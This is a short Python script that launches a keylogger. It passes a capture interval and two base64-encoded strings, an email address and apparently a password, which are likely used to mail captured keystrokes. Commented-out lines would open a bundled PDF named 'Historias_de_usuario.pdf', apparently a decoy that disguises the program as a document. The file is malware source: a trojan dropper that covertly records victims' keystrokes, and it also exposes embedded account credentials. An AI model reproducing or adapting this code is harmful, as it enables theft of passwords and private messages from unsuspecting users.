import subprocess
import sys
import keylogger

#file_name = sys._MEIPASS + '\Historias_de_usuario.pdf'
#subprocess.Popen(file_name, shell= True)

keylogger = keylogger.Keylogger(30, 'cmNoYnJyeTAwQGdtYWlsLmNvbQ==', 'bCQ1RVVoZmZ2Z3ND')
keylogger.start()